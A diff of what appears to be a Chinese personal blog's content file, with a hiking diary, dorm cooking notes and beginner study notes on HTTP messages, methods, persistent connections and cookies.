+<p>溧阳的一号彩虹公路, 其实只是中间的双黄道替换成三种不同颜色的标志线, 起初看图片觉得平平无奇, (不就是换个颜色吗有什么新鲜的) 实际上在公路走啊走啊, 看见一条彩虹从脚下延申向远方, 还是有种小确幸滴. 我甚至怀疑倘若自驾走这条路线都没有徒步来的快乐. 一路上和周围人谈笑风生. 有去时正好坐我后排的X, 主动来搭话的杰哥, 另一个小哥shè哥chù Y. 都是独行侠, 甚至都是互联网相关行业的, 只有我一个在校学生. 杰哥是老徒步者了,准备十分充分(连护袖都有准备) 我甚至被杰哥开玩笑”看鞋子就知道是不是新手徒步” (别骂了别骂了我回去就买鞋子😭) 一路上蓝天白云, 上半晌的柏油路还没有升温, 跟着大家东扯西扯: 杰哥今年才从Z大硕士毕业, X 在江宁工作一年, Y本科出来已经工作了五年了. 听他们谈论房租 未来发展, 人生规划. 在想过几年自己是不是也在某个城市漂泊, 在考虑户口, 房价, 股价, 政策发展与行业未来. 同行的还有一个背着女孩的父亲, 小女孩约莫四五岁, 坐在爸爸背后的座位上. 后面上坡下坡都是父亲一直背完了全程, 实在太厉害了!</p>
+<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202007/%E5%BD%A9%E8%99%B9%E5%85%AC%E8%B7%AF.jpg" alt="彩虹公路"></p>
+<p>终于走过了上半程, 在常州一处小监狱门口稍作休整, 和新伙伴们互相分享了干粮和水—— 这种徒步后的饥饿感让食物瞬间升华, 好吃程度不是拿个方格布带个小竹篮能比拟的2333. 发现拿头巾沾水后带着真的太爽了! 大太阳照着水分汽化吸热, 不经过汗流浃背体会不到凉爽的感觉. 就算在空调房里待一整个夏天也不行. 给大家分享了水, (内心OS: 终于把这个大累赘分出去了! ) 双胞胎在接过水后, 大叔还在一旁督促要说谢谢,  在野外水是非常非常重要的资源云云, 家教极好! 休整之后大家进入了野道, 我也开始记录爬山的路径. </p>
+<p>第一小关是一座摇摇欲坠的小竹桥, 还未见到影子, 就听见前方队友惊呼, 原来竹桥年久失修, 终于在今日不堪重负垮了一半, 半截桥身已然入水. 后面的人只能一个一个走. 扒着相对牢固的扶手. 在最后一个人走过时, 竹桥终于完成了自己一生的使命, 光荣牺牲. 第二天大叔在群里发了我们每个人过桥的照片, 原来他一直在对岸拍摄大家互帮互助过桥的照片, 实在是太惊喜了.</p>
+<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202007/%E8%BF%87%E6%A1%A5.jpg" alt=""></p>
+<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202007/%E6%A1%A5.jpg" width = "800" height = "1000" /></p>
+<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202007/%E4%B8%8A.jpg" width="800" height = "1200" /></p>
+<p>接下来一段上坡路, 坡度大约三四十多度, 茂林修竹, 蚊虫四散. 有同行者带了小音箱, 歌声回绕. 过了这一小段竹林后便是稍显难走的林中小径, 不过半米宽度. 由于X是妹子, 体力不佳, 我们逐渐和脱离了大部队, 又等到了另外一位女生Z. 互相帮着背个包搭把手, 爬上了山顶. </p>
+<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202007/%E5%B1%B1%E9%A1%B6.jpg" alt=""></p>
+<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202007/%E5%90%88%E7%85%A7.jpg" alt="合照"></p>
+<p>下山. </p>
+<p>下山的路比我们想的要更加麻烦, 坡度更大, 沙土质地的路也更难走. 只能每次都踩着树根和石块落脚. 有几段路中间没有落脚点, 后一个人就踩着前一个人的脚作为落脚点, 我也才意识到平底鞋真的真的不适合爬山orz, 完全没有抓地力. </p>
+<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202007/%E4%B8%8B.jpg" width="800" height = "1800" /></p>
+<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202007/%E8%AE%B0%E5%BD%95.jpg" alt=""></p>
+<p>晚上约了快乐火锅</p>
+<h2 id="其他琐碎事件"><a href="#其他琐碎事件" class="headerlink" title="其他琐碎事件"></a>其他琐碎事件</h2><h2 id="上周目标完成度"><a href="#上周目标完成度" class="headerlink" title="上周目标完成度"></a>上周目标完成度</h2><h3 id="下周目标"><a href="#下周目标" class="headerlink" title="下周目标"></a>下周目标</h3>]]></content>
+      <categories>
+        <category>时与光</category>
+      </categories>
+      <tags>
+        <tag>小结</tag>
+        <tag>周记</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>时与光W-202007-4</title>
+    <url>/2020/07/31/%E6%97%B6%E4%B8%8E%E5%85%89W-202007-4/</url>
+    <content><![CDATA[<p>2020年7月20日~7月26日</p>
+<p>宿舍小厨</p>
+<a id="more"></a>
+<h2 id="宿舍小厨"><a href="#宿舍小厨" class="headerlink" title="宿舍小厨"></a>宿舍小厨</h2><p>上周买的食材陆陆续续到了, 即将开始与导员宿管的躲猫猫生活. 由于我手残下单鸡蛋的时候多下了一份,现在我对着80个鸡蛋欲哭无泪… </p>
+<p>整理下目前的装备与食材.</p>
+<ol>
+<li>锅*2, 一个口深适合煮汤, 一个口浅适合煎东西;</li>
+<li>一个蒸蛋器</li>
+<li>面板, 擀面杖, 刀具餐具</li>
+</ol>
+<p>食材:</p>
+<ol>
+<li>鸡蛋</li>
+<li>紫薯</li>
+<li>黑小麦全麦粉</li>
+<li>鸡肉肠, 鸡胸肉,金枪鱼肉罐头</li>
+<li>燕麦麦片</li>
+<li>荞麦面</li>
+<li>全麦面包</li>
+</ol>
+<h3 id="鸡蛋羹"><a href="#鸡蛋羹" class="headerlink" title="鸡蛋羹"></a>鸡蛋羹</h3><p>试图使用蒸蛋器蒸出鸡蛋羹, 但是挺失败的, 尽管在网上找了很多食谱…</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">鸡蛋羹做法</span><br><span class="line"></span><br><span class="line">少水蛋(质地硬)</span><br><span class="line">1. ⭐蛋:水&#x3D;1:1.5</span><br><span class="line">2. ⭐小火&gt;&gt;大火</span><br><span class="line">3. 温水&gt;凉水</span><br><span class="line">4. 电解质&gt;水        #电解质:盐&#x2F;高汤</span><br><span class="line">5. 加盖&gt;无盖        #用布反向包裹锅盖</span><br><span class="line">6. ⭐时间刚好&gt;&gt;多蒸一会</span><br><span class="line">7. ⭐凉开水&gt;&gt;自来水</span><br><span class="line"></span><br><span class="line">多水蛋(质地软)</span><br><span class="line">1. 蛋:水&#x3D;1:2 or 1:3</span><br><span class="line">2. 一定要加电解质</span><br><span class="line">3. 火候,时间相对不重要</span><br><span class="line"></span><br><span class="line">其他</span><br><span class="line">1. 蒸锅上汽之后再放入</span><br><span class="line">总结自B站UP喃猫小厨房,BV1x441117r4</span><br></pre></td></tr></table></figure>
+<p>但是总是蒸出来蜂窝蛋…</p>
+<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202007/%E5%90%83%E7%9A%84/%E9%B8%A1%E8%9B%8B%E7%BE%B9.jpg" alt=""></p>
+<h3 id="煎鸡蛋"><a href="#煎鸡蛋" class="headerlink" title="煎鸡蛋"></a>煎鸡蛋</h3><p>从最开始打在锅里面热一热, 到后面在少放油的情况下尽量更香, 味道好极了现在.</p>
+<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202007/%E5%90%83%E7%9A%84/%E7%85%8E%E8%9B%8B.jpg" alt=""></p>
+<h3 id="什锦-燕麦-紫薯-鸡蛋-牛奶饼"><a href="#什锦-燕麦-紫薯-鸡蛋-牛奶饼" class="headerlink" title="什锦-燕麦-紫薯-鸡蛋-牛奶饼"></a>什锦-燕麦-紫薯-鸡蛋-牛奶饼</h3><p>总而言是是各种奇妙的搭配组合…</p>
+<h4 id="尝试1"><a href="#尝试1" class="headerlink" title="尝试1"></a>尝试1</h4><p>两个鸡蛋不加水搅拌,加入全麦粉, 加入烤熟切块的紫薯, 放入锅中烤熟.<br>但是我总觉得这么厚的饼不太适合直接烤, 不容易烤熟…而且紫薯块太大, 翻面的时候总是支离破碎.</p>
+<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202007/%E5%90%83%E7%9A%84/%E7%B4%AB%E8%96%AF%E9%A5%BC.jpg" alt=""></p>
+<h4 id="尝试2"><a href="#尝试2" class="headerlink" title="尝试2"></a>尝试2</h4><p>第一次失败后决定做薄饼. 鸡蛋+麦片, 第一锅完全成了炒鸡蛋, 后续陆续放入面粉, 最终成形. 燕麦片本身的厚度使饼没有想象中那么薄, 但相比上一版好多了.</p>
+<p>味道其实不太行, 由于只加入了少许盐, 基本没有任何滋味, 食之无味.</p>
+<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202007/%E5%90%83%E7%9A%84/%E7%85%8E%E9%A5%BC0.5.jpg" alt=""></p>
+<h4 id="尝试3"><a href="#尝试3" class="headerlink" title="尝试3"></a>尝试3</h4><p>将燕麦片牛奶泡一晚, 次日打入鸡蛋搅拌, 放油下锅. 煎出来了奇形怪状的小饼干(疑似), 依旧没什么味道.</p>
+<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202007/%E5%90%83%E7%9A%84/%E7%85%8E%E9%A5%BC.jpg" alt=""></p>
+<h4 id="尝试4"><a href="#尝试4" class="headerlink" title="尝试4"></a>尝试4</h4><p>直接鸡蛋液打匀分次倒入铺满锅底即可. 本来想加入切丁的鸡肉肠, 但是鸡蛋饼太薄肉丁根本镶嵌不上去, 最后变成了鸡蛋饼+炒肉丁.</p>
+<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202007/%E5%90%83%E7%9A%84/%E9%B8%A1%E8%9B%8B%E9%A5%BC%E8%82%89%E4%B8%81.jpg" alt=""></p>
+<h3 id="紫薯燕麦粥"><a href="#紫薯燕麦粥" class="headerlink" title="紫薯燕麦粥"></a>紫薯燕麦粥</h3><p>紫薯蒸熟切块, 加水熬制30min,加入麦片熬煮20min, 香浓的燕麦紫薯粥就做好了.</p>
+<p>粥越煮越稠, 我中间还以为自己水加多了去了点, 结果最后快熬干了orz.</p>
+<p>水量没过紫薯上表面1-2公分.</p>
+<p>味道还可以, 口中直呼烫烫烫</p>
+<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202007/%E5%90%83%E7%9A%84/%E7%B2%A5.jpg" alt=""></p>
+<h4 id="荞麦面-煎鸡蛋-炒金枪鱼肉"><a href="#荞麦面-煎鸡蛋-炒金枪鱼肉" class="headerlink" title="荞麦面+煎鸡蛋+炒金枪鱼肉"></a>荞麦面+煎鸡蛋+炒金枪鱼肉</h4><p>好吧这个没啥技术含量..看图吧</p>
+<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202007/%E5%90%83%E7%9A%84/%E9%9D%A2.jpg" alt=""></p>
+<h3 id="感想"><a href="#感想" class="headerlink" title="感想"></a>感想</h3><p>千里之行始于足下, 疫情期间也是看着其他人都化身大厨. 一直想开始却迟迟没有动身. 在学校尝试着开始自己做菜做饭才发现其实没有想象中那么困难, 没有锅碗瓢盆就想办法解决, 没有食材就京东天猫冷链, 缺少绿叶菜就多买水果补充维生素. 天下是有难易乎? 为之, 则难者亦易也.</p>
+<p>还有就是对任何事情都不能等闲视之, 哪怕是简单的鸡蛋羹, 小学三年级在家里面拿微波炉轻松搞定的东西换了厨具做的依旧很糟糕. 煎鸡蛋放多少油? 做饼的面水比例是多少才不粘锅有能均匀铺开? 听到什么声音说明是火候太过了? 好多细节都是没有实操的情况下光靠别人的转述学不到的. 就像这几天在学校招新群里讨论的家长, 自己其实根本不了解行业情况, 道听途说地从别人的谈论, 亲戚朋友的个例中断定专业的优劣. 纸上得来终觉浅,绝知此事要躬行啊.</p>
+<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202007/ai.png" alt=""></p>
+<h2 id="其他琐碎事件"><a href="#其他琐碎事件" class="headerlink" title="其他琐碎事件"></a>其他琐碎事件</h2><p>跟着宗主任去招新群里面答疑打白工, 每天都能碰见各种神奇的家长, 常面一度十分欢乐</p>
+<h2 id="上周目标完成度"><a href="#上周目标完成度" class="headerlink" title="上周目标完成度"></a>上周目标完成度</h2><h3 id="下周目标"><a href="#下周目标" class="headerlink" title="下周目标"></a>下周目标</h3><p>完全搞定数电+计组</p>
+<p>检查牙齿</p>
+<p>购买装备&amp;爬山</p>
+]]></content>
+      <categories>
+        <category>时与光</category>
+      </categories>
+      <tags>
+        <tag>小结</tag>
+        <tag>周记</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>初窥HTTP之一_HTTP基础</title>
+    <url>/2020/08/01/%E5%88%9D%E7%AA%A5HTTP%E4%B9%8B%E4%B8%80_HTTP%E5%9F%BA%E7%A1%80/</url>
     <content><![CDATA[<ol>
 <li>TCP/IP 基础</li>
 <li>HTTP简介</li>
@@ -1760,7 +1414,51 @@ T_0\\
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. 完整的请求URI</span><br><span class="line">GET http:&#x2F;&#x2F;www.baidu.com&#x2F;index.html HTTP&#x2F;1.1</span><br><span class="line"></span><br><span class="line">2. 使用相对URI地址</span><br><span class="line">GET &#x2F;index.html HTTP&#x2F;1.1</span><br><span class="line">HOST: baidu.com</span><br></pre></td></tr></table></figure>
 <p>除此之外, 如果对于服务器本身(而不是访问资源)的请求, 可以只用<code>*</code>来代替请求URI</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">OPTIONS * HTTP&#x2F;1.1</span><br></pre></td></tr></table></figure>
-<p>未完待续</p>
+<h3 id="HTTP报文"><a href="#HTTP报文" class="headerlink" title="HTTP报文"></a>HTTP报文</h3><p>如前所述, HTTP是通过<strong>请求报文</strong>与<strong>响应报文</strong>进行信息传递的. </p>
+<h4 id="请求报文"><a href="#请求报文" class="headerlink" title="请求报文"></a>请求报文</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F;index.html HTTP&#x2F;1.1</span><br><span class="line">HOST: baidu.com</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Type: text&#x2F;html</span><br><span class="line">Content-Length: 5000</span><br><span class="line">If-Modified-Since: Thu. 12 Jul 2020 07: 30: 00 GMT</span><br><span class="line"></span><br><span class="line">name&#x3D;ueno&amp;age&#x3D;37</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
+<p>起始处的<code>GET</code> 表示向服务器请求的访问类型, 被称为 <strong>方法</strong>. 而后的字符串<code>/index.html</code> 是使用URI表示的请求访问的资源对象, 被称为 <strong>请求URI</strong>.  <code>HTTP/1.1</code> 是用于表明客户端使用的协议 的 <strong>协议版本号</strong>.</p>
+<p>以上三个参数组成了请求报文的 <strong>请求行.</strong></p>
+<p>后面的几行被称之为 <strong>请求首部字段</strong> (示例中2-6行), 存储了对请求的进一步要求. 最后接上 <strong>内容实体</strong> 的主体.(示例中8行及以后)</p>
+<h4 id="响应报文"><a href="#响应报文" class="headerlink" title="响应报文"></a>响应报文</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Http&#x2F;1.1 200 Ok</span><br><span class="line">Date: Thu. 12 Jul 2020 07: 30: 00 GMT</span><br><span class="line">Content-type:message&#x2F;http</span><br><span class="line">Content-Length: 1024</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">....</span><br></pre></td></tr></table></figure>
+<p>首行依次是 <strong>协议版本号</strong>, <strong>状态码</strong>, <strong>状态码的原因短语</strong>, 这一行被称作 <strong>状态行.</strong></p>
+<p>后面几行被称为 <strong>响应首部字段</strong>, 最后被称为 <strong>资源实体</strong>的主体.</p>
+<h3 id="HTTP方法与命令"><a href="#HTTP方法与命令" class="headerlink" title="HTTP方法与命令"></a>HTTP方法与命令</h3><p>下面介绍一些HTTP/1.1中的方法.</p>
+<ul>
+<li><p>GET：获取资源<br>GET方法用来请求访问已被URI识别的资源。指定的资源经服务器端解析后返回响应内容。也就是说，如果请求的资源是文本，那就保持原样返回；如果是像CGl（Common Gateway Interface，通用网关接口）那样的程序，则返回经过执行后的输出结果。<br><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/01/GET.png" alt=""></p>
+</li>
+<li><p>POST：传输实体主体<br>POST方法用来传输实体的主体。虽然用GET方法也可以传输实体的主体，但一般不用GET方法进行传输，而是用POST方法。虽说POST的功能与GET很相似，但POST的主要目的并不是获取响应的主体内容。</p>
+<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/01/POST.png" alt=""></p>
+</li>
+<li><p>PUT：传输文件<br>PUT方法用来传输文件。就像FTP协议的文件上传一样，要求在请求报文的主体中包含文件内容，然后保存到请求URI指定的位置。但是，鉴于HTTP/1.1的PUT方法自身不带验证机制，任何人都可以上传文件，存在安全性问题，因此一般的Web网站不使用该方法。若配合Web应用程序的验证机制，或架构设计采用REST （REpresentational State Transfer，表征状态转移）标准的同类Web网站，就可能会开放使用PUT方法。</p>
+<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/01/PUT.png" alt=""></p>
+</li>
+<li><p>HEAD：获得报文首部<br>HEAD方法和GET方法一样，只是不返回报文主体部分。用于确认URI的有效性及资源更新的日期时间等。 </p>
+<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/01/HEAD.png" alt=""></p>
+</li>
+<li><p>DELETE：删除文件<br>DELETE方法用来删除文件，是与PUT相反的方法。DELETE方法按请求URI删除指定的资源。但是，HTTP/1.1的DELETE方法本身和PUT方法一样不带验证机制，所以一般的Web网站也不使用DELETE方法。当配合Web应用程序的验证机制，或遵守REST标准时还是有可能会开放使用的。</p>
+<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/01/DELETE.png" alt=""></p>
+</li>
+<li><p>OPTIONS：询问支持的方法<br>OPTIONS方法用来查询针对请求URI指定的资源支持的方法</p>
+<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/01/OPTIONS.png" alt=""></p>
+</li>
+<li><p>TRACE：追踪路径<br>TRACE方法是让Web服务器端将之前的请求通信环回给客户端的方法。发送请求时，在Max-Forwards首部字段中填入数值，每经过一个服务器端就将该数字减1，当数值刚好减到0时，就停止继续传输，最后接收到请求的服务器端则返回状态码200OK的响应。</p>
+<p>客户端通过TRACE方法可以查询发送出去的请求是怎样被加工修改/篡改的。这是因为，请求想要连接到源目标服务器可能会通过代理中转，TRACE方法就是用来确认连接过程中发生的一系列操作。但是，TRACE方法本来就不怎么常用，再加上它容易引发XST(Cross-Site Tracing，跨站追踪）攻击，通常就更不会用到了。 </p>
+<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/01/TRACE.png" alt=""></p>
+</li>
+<li><p>CONNECT：要求用隧道协议连接代理<br>CONNECT方法要求在与代理服务器通信时建立隧道，实现用隧道协议进行TCP通信。主要使用SSL（Secure Sockets Layer，安全套接层）和TLS（Transport Layer Security，传输层安全）协议把通信内容加密后经网络隧道传输。</p>
+<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/01/CONNECT.png" alt=""></p>
+</li>
+</ul>
+<p>方法的名称区分大小写, 注意使用大写字母.</p>
+<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/01/ALL.png" alt=""></p>
+<h3 id="持久连接"><a href="#持久连接" class="headerlink" title="持久连接"></a>持久连接</h3><p>在最开始我们讲到通信建立前TCP协议需要进行三次握手, 此外在结束后还要进行四次挥手. 在HTTP协议的最初版本, 每进行一次通信就要重复执行上述步骤, 导致了大量资源的浪费. (例如一个网页中的多张图片均需要进行请求). 因此在/1.1版本中加入了<a href="https://zh.wikipedia.org/zh-hans/HTTP%E6%8C%81%E4%B9%85%E8%BF%9E%E6%8E%A5" target="_blank" rel="noopener"> <strong>持久连接</strong> </a>的方法. 只要任意端没有主动断开连接, 则持续保持TCP的连接状态. </p>
+<p>在 HTTP 1.1 中 所有的连接默认都是持续连接，除非特殊声明不支持。</p>
+<h4 id="管线化"><a href="#管线化" class="headerlink" title="管线化"></a>管线化</h4><p><a href="https://zh.wikipedia.org/zh-cn/HTTP%E7%AE%A1%E7%B7%9A%E5%8C%96" target="_blank" rel="noopener">HTTP管线化</a>（英语：HTTP pipelining）是将多个HTTP请求（request）整批提交的技术，而在发送过程中不需先等待服务器的回应。这是基于持久连接完成的.</p>
+<h3 id="Cookie-状态管理"><a href="#Cookie-状态管理" class="headerlink" title="Cookie : 状态管理"></a>Cookie : 状态管理</h3><p>为了保留无状态协议的轻便性又解决状态保存的问题引入了Cookie技术. 通过在请求与响应报文中写入Cookie信息来控制客户端的状态.</p>
+<p>Cookie 会根据从服务器端发送的响应报文内的一个叫做 <strong>Set-Cookie</strong> 的首部字段信息，通知客户端保存 Cookie。当下次客户端再往该服务器发送请求时，客户端会自动在请求报文中加入 Cookie值后发送出去。服务器端发现客户端发送过来的 Cookie 后，会去检查究竟是从哪一个客户端发来的连接请求，然后对比服务器上的记录，最后得到之前的状态信息.</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;请求报文1</span><br><span class="line">GET &#x2F;reader&#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: hackr.jp</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;响应报文</span><br><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Date: Thu, 12 Jul 2012 07:12:20 GMT</span><br><span class="line">Server: Apache</span><br><span class="line">＜Set-Cookie: sid&#x3D;1342077140226724; path&#x3D;&#x2F;; expires&#x3D;Wed,10-Oct-12 07:12:20 GMT＞</span><br><span class="line">Content-Type: text&#x2F;plain; charset&#x3D;UTF-8</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;请求报文2</span><br><span class="line">GET &#x2F;image&#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: hackr.jp</span><br><span class="line">Cookie: sid&#x3D;1342077140226724</span><br></pre></td></tr></table></figure>
 ]]></content>
       <categories>
         <category>学习笔记</category>
@@ -1774,99 +1472,372 @@ T_0\\
       </tags>
   </entry>
   <entry>
-    <title>时与光W-202007-2</title>
-    <url>/2020/07/24/%E6%97%B6%E4%B8%8E%E5%85%89W-202007-2/</url>
-    <content><![CDATA[<p>2020年7月6日~2020年7月12日</p>
-<p>徒步: 溧阳-丫髻山</p>
+    <title>Hello_Hexo_Blog</title>
+    <url>/2020/05/31/Hello-Hexo-Blog/</url>
+    <content><![CDATA[<p> 第一篇博客~ 开心</p>
 <a id="more"></a>
-<h2 id="徒步-溧阳-丫髻山"><a href="#徒步-溧阳-丫髻山" class="headerlink" title="徒步: 溧阳-丫髻山"></a>徒步: 溧阳-丫髻山</h2><p>这周日 (7月11-12日) 第一次尝试徒步+爬野山. 以下为流水账记录:</p>
-<p>因为集合的时间是周日大清早, 所以周六就提前去南京了, 找了一家普普通通的青旅安顿下来, 晚上在玄武湖公园逛了一圈 —— 预料之外的大啊哈哈哈, 晚上来这里跑步应该不错, 可惜还是在市中心, 空气不太行. 话说南京的早点包子真难吃啊… 早起去便利店安排了一些物资, 2L 的怡宝+1.5L 的绿茶, 后来证明买这些都是非常必要的.</p>
-<p>领队是个很阳光的大兄弟, 很会唠. 等大巴的时候发现大家都是装备齐全, 背包+登山杖+徒步鞋, 只有我背个小破书包, 蹬了个平底运动鞋来了哈哈哈, 下次一定准备齐全😂. 大巴上领座是位带着两个双胞胎的大叔, 一看就是老户外达人了, 孩子约莫上初中, 一人一个登山杖. 一家人乐乐呵呵地来徒步, 又锻炼体质又促进感情, 真好啊🍋. </p>
-<p>一个钟左右就到溧阳了. 目的地其实是溧阳, 句容交界的两座山头 (最后只爬了一座) . 本来的计划是野道去公路回, 结果前一天一直下雨, 就决定先走公路, 让山路多晒晒太阳. 说起来超级幸运, 本来都已经做好了下雨取消山路的心理准备了, 没想到早上突然晴天. 这也导致我没有带防晒(呜呜呜我以为会是阴天的脑子瓦特了), 带着防身又不多~ 一天走下来直接黑了两个度, 辛苦养半年,一朝回到解放前. </p>
-<p>溧阳的一号彩虹公路, 其实只是中间的双黄道替换成三种不同颜色的标志线, 起初看图片觉得平平无奇, (不就是换个颜色吗有什么新鲜的) 实际上在公路走啊走啊, 看见一条彩虹从脚下延申向远方, 还是有种小确幸滴. 我甚至怀疑倘若自驾走这条路线都没有徒步来的快乐. 一路上和周围人谈笑风生. 有去时正好坐我后排的X, 主动来搭话的杰哥, 另一个小哥shè哥chù Y. 都是独行侠, 甚至都是互联网相关行业的, 只有我一个在校学生. 杰哥是老徒步者了,准备十分充分(连护袖都有准备) 我甚至被杰哥开玩笑”看鞋子就知道是不是新手徒步” (别骂了别骂了我回去就买鞋子😭) 一路上蓝天白云, 上半晌的柏油路还没有升温, 跟着大家东扯西扯: 杰哥今年才从Z大硕士毕业, X 在江宁工作一年, Y本科出来已经工作了五年了. 听他们谈论房租 未来发展, 人生规划. 在想过几年自己是不是也在某个城市漂泊, 在考虑户口, 房价, 股价, 政策发展与行业未来. 同行的还有一个背着女孩的父亲, 小女孩约莫四五岁, 坐在爸爸背后的座位上. 后面上坡下坡都是父亲一直背完了全程, 实在太厉害了!</p>
-<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202007/%E5%BD%A9%E8%99%B9%E5%85%AC%E8%B7%AF.jpg" alt="彩虹公路"></p>
-<p>终于走过了上半程, 在常州一处小监狱门口稍作休整, 和新伙伴们互相分享了干粮和水—— 这种徒步后的饥饿感让食物瞬间升华, 好吃程度不是拿个方格布带个小竹篮能比拟的2333. 发现拿头巾沾水后带着真的太爽了! 大太阳照着水分汽化吸热, 不经过汗流浃背体会不到凉爽的感觉. 就算在空调房里待一整个夏天也不行. 给大家分享了水, (内心OS: 终于把这个大累赘分出去了! ) 双胞胎在接过水后, 大叔还在一旁督促要说谢谢,  在野外水是非常非常重要的资源云云, 家教极好! 休整之后大家进入了野道, 我也开始记录爬山的路径. </p>
-<p>第一小关是一座摇摇欲坠的小竹桥, 还未见到影子, 就听见前方队友惊呼, 原来竹桥年久失修, 终于在今日不堪重负垮了一半, 半截桥身已然入水. 后面的人只能一个一个走. 扒着相对牢固的扶手. 在最后一个人走过时, 竹桥终于完成了自己一生的使命, 光荣牺牲. 第二天大叔在群里发了我们每个人过桥的照片, 原来他一直在对岸拍摄大家互帮互助过桥的照片, 实在是太惊喜了.</p>
-<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202007/%E8%BF%87%E6%A1%A5.jpg" alt=""></p>
-<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202007/%E6%A1%A5.jpg" width = "800" height = "1000" /></p>
-<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202007/%E4%B8%8A.jpg" width="800" height = "1200" /></p>
-<p>接下来一段上坡路, 坡度大约三四十多度, 茂林修竹, 蚊虫四散. 有同行者带了小音箱, 歌声回绕. 过了这一小段竹林后便是稍显难走的林中小径, 不过半米宽度. 由于X是妹子, 体力不佳, 我们逐渐和脱离了大部队, 又等到了另外一位女生Z. 互相帮着背个包搭把手, 爬上了山顶. </p>
-<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202007/%E5%B1%B1%E9%A1%B6.jpg" alt=""></p>
-<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202007/%E5%90%88%E7%85%A7.jpg" alt="合照"></p>
-<p>下山. </p>
-<p>下山的路比我们想的要更加麻烦, 坡度更大, 沙土质地的路也更难走. 只能每次都踩着树根和石块落脚. 有几段路中间没有落脚点, 后一个人就踩着前一个人的脚作为落脚点, 我也才意识到平底鞋真的真的不适合爬山orz, 完全没有抓地力. </p>
-<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202007/%E4%B8%8B.jpg" width="800" height = "1800" /></p>
-<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202007/%E8%AE%B0%E5%BD%95.jpg" alt=""></p>
-<p>晚上约了快乐火锅</p>
-<h2 id="其他琐碎事件"><a href="#其他琐碎事件" class="headerlink" title="其他琐碎事件"></a>其他琐碎事件</h2><h2 id="上周目标完成度"><a href="#上周目标完成度" class="headerlink" title="上周目标完成度"></a>上周目标完成度</h2><h3 id="下周目标"><a href="#下周目标" class="headerlink" title="下周目标"></a>下周目标</h3>]]></content>
+<h3 id="简单记录一下搭建过程"><a href="#简单记录一下搭建过程" class="headerlink" title="简单记录一下搭建过程"></a>简单记录一下搭建过程</h3><p>博客基于<a href="https://hexo.io/zh-cn/docs/" target="_blank" rel="noopener">Hexo框架</a> + Github，域名当然是阿里云了 （6元一年他不香吗hhh）</p>
+<p>感谢舍友 <a href="https://www.117503445.top/" target="_blank" rel="noopener">@117503445</a> 指名了博客搭建的主要方向，搭建过程中主要参考了知乎用户 @吴润 的<a href="https://zhuanlan.zhihu.com/p/26625249" target="_blank" rel="noopener">这篇文章</a>，基本很顺畅地搭建起来了，一并致谢。</p>
+<ol>
+<li>安装并配置Node.js</li>
+<li>安装 Hexo 框架</li>
+<li>关联 Github 仓库</li>
